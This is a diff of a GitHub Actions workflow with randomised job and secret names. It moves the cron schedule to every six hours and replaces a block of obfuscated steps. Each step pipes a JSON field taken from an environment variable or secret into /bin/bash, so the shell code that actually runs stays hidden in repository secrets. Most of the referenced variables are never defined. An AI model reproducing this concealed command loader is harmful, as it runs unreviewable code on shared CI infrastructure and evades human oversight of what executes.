@@ -1,30 +1,23 @@
 name: mengtancheng9845
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '43 1/6 * * *'
+    - cron: '48 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: mengtancheng9845
         env:
-          g86210: ${{ secrets.g86210 }}
+          uxcl4920: ${{ secrets.uxcl4920 }}
         run: |
-          echo $g86210 | jq -r .a94 | /bin/bash
-          echo $ne7170 | jq -r .afa88 | /bin/bash
-          echo $e3951 | jq -r .vkefs52 | /bin/bash
-          echo $qg73160 | jq -r .mtr41696 | /bin/bash
-          echo $t434 | jq -r .rqqn5087 | /bin/bash
-          echo $lbjbg9012 | jq -r .qdun737 | /bin/bash
-          echo $qr9 | jq -r .gu5 | /bin/bash
-          echo $v3831 | jq -r .wtpsa1 | /bin/bash
-          echo $b584 | jq -r .wiw5 | /bin/bash
-          echo $ap52865 | jq -r .feqoo6 | /bin/bash
-          echo $hzlrl69 | jq -r .fawi1 | /bin/bash
-          echo $pcrfc4148 | jq -r .qa122 | /bin/bash
-          echo $jnpjd362 | jq -r .tld3672 | /bin/bash
+          echo $uxcl4920 | jq -r .pidms76 | /bin/bash
+          echo $dvb6 | jq -r .zqpbv261 | /bin/bash
+          echo $yj51917 | jq -r .qcm418 | /bin/bash
+          echo $za81 | jq -r .lwkfw97 | /bin/bash
+          echo $lx9406 | jq -r .bt5690 | /bin/bash
+          echo $jhdqj3 | jq -r .w77 | /bin/bash
+          echo $rt809 | jq -r .q5639 | /bin/bash
+          echo $qdtbq1 | jq -r .nqstg128 | /bin/bash
 
